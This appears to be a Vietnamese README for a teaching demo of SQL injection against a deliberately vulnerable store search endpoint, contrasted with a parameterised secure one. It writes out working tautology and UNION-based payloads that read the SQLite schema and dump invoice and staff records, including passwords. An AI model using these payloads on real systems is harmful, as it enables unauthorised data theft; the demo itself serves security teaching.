Đây là một công cụ tìm kiếm đơn giản trong hệ thống của 1 cửa hàng nhằm mô phỏng môi trường sản phẩm/ứng dụng thực tế. Muc đích đặt ra cho ứng dụng này chỉ để khách hàng có thể tìm kiếm/tra cứu thông tin sản phẩm.

Bản demo này bao gồm:

- 1 web client viết bằng Javascript/HTML giúp việc thực hiện request được thuận tiện, và kết quả được trình bày rõ ràng, dễ theo dõi.
- 1 server viết bằng Python cho phép xử lý yêu cầu từ client cũng như truy xuất dữ liệu từ cơ sở dữ liệu.
- Cơ sở dữ liêu ở đây là Sqlite 3, đã được tích hợp trong python 3.

Về phía cơ sở dữ liệu, có 3 bảng dữ liệu đã được dựng sẵn. Về mặt logic và bảo mật, client chỉ được truy xuất dữ liệu từ bảng `Products`. Trong các ví dụ sau, chúng ta sẽ tận dụng lỗ hổng SQL Injection để lấy dữ liệu từ các bảng còn lại, là `Staff` và `Invoice`.

Về backend, có 2 đường dẫn gọi đến server, `/search` và `/secured-search`. 2 đường dẫn này nhận cùng 1 loại tham số giống nhau, và đều giúp tìm được các sản phẩm trong bảng dữ liêu `Products`. `/search` xử lý tham số sai cách, và có khả năng gây rò rỉ dữ liệu nếu bị tấn công. Ngược lại `/secured-search` sẽ chuẩn bị query đúng cách, ngăn chặn được các cuộc tấn công SQL Injection.

Demo này là 1 ứng dụng đơn giản, với 1 input để nhập từ khoá hoặc tấn công cơ sở dữ liệu. Ở đây cũng bao gồm những ví dụ đã được chuẩn bị sẵn theo trình tự các bước để truy cập vào tất cả các bảng dữ liệu trong hệ thống, 1 khu vực để hiển thị kết quả từ backend và chuỗi SQL được sử dụng để lấy được những kết quả đó.

Các bước tấn công như sau:

1. Đầu tiên, ta thực hiện 1 phép tìm kiếm thông thường. Dựa vào kết quả trên, ta có thể đoán được cách query được chuẩn bị. Từ đó ta sẽ chuẩn bị tấn công bằng SQL Injection. Trong ví dụ này ta thấy `apple` hoặc `orange` đều cho ra kết quả là 3 cột dữ liệu. Từ đó, ta có thể đoán được cấu trúc của hệ thống này:

```
apple

	SELECT ?, ?, ? FROM ? WHERE ? = 'apple'

orange

	SELECT ?, ?, ? FROM ? WHERE ? = 'orange'

' OR ''='

	SELECT ?, ?, ?
	FROM ?
	WHERE name like '' OR ''=''

```

2. Dựa vào đây, ta có thể chuẩn bị được đòn tấn công đầu tiên. Chỉ cần ta:

- Lấy đúng 3 cột từ mọi bảng dữ liệu.
- Dấu `'` sẽ kết thúc query, nên ta có thể chèn thêm `''='` để biến nó này 1 phép so sánh luôn đúng.
- Kèm thêm hàm `UNION`.
  Ta có thể lấy được mọi dữ liệu trong hệ thống. Dù không biết đây là cơ sở dữ liệu nào, ta vẫn có thử truy cập các bảng chứa schema của từng cơ sở dữ liệu cho đến khi thành công, trong trường hợp này nội dung tìm kiếm sẽ là:

```
' UNION SELECT type, tbl_name, sql FROM sqlite_master WHERE ''='

	SELECT ?, ?, ?
	FROM ?
	WHERE ? LIKE '';
	UNION
		SELECT type, tbl_name, sql
		FROM sqlite_master
		WHERE ''=''

```
với `master`thường là 1 database chứa thông tin của tất cả các database khác trong hệ thống.

Query trên cho phép ta lấy được thông tin schema của tất cả các bảng còn lại trong hệ thống.

3. Từ đó, ta có thể tiếp tục lấy dữ liệu từ các bảng còn lại:

```
' UNION SELECT type, tbl_name, sql FROM sqlite_master WHERE 1 UNION SELECT id, total, staff_id FROM invoice WHERE ''='

	SELECT id, name, description
	FROM products
	WHERE name = ''
	UNION
		SELECT type, tbl_name, sql
		FROM sqlite_master
		WHERE 1
		UNION
			SELECT id, total, staff_id
			FROM invoice
			WHERE ''=''

' UNION SELECT type, tbl_name, sql FROM sqlite_master WHERE 1 UNION SELECT id, total, staff_id FROM invoice WHERE 1 UNION SELECT id, name, phone FROM staff WHERE ''='

	SELECT id, name, description
	FROM products
	WHERE name LIKE ''
		UNION
		SELECT type, tbl_name, sql
		FROM sqlite_master
		WHERE 1
		UNION
			SELECT id, total, staff_id
			FROM invoice
			WHERE 1
			UNION
				SELECT id, name, pass
				FROM staff
				WHERE ''=''

```
- Nếu thực hiện lại những ví dụ trên bằng `secured search`, ta sẽ không lấy được dữ liệu. Nhìn vào query của server, ta có thể nhận thấy query đã bị thay đổi. Điều này là nhờ ta đã xử lý tham số 1 cách chính xác bằng các công cụ được cung cấp sẵn bởi SQLite trong Python, qua đó ngăn chặn được SQL Injection.
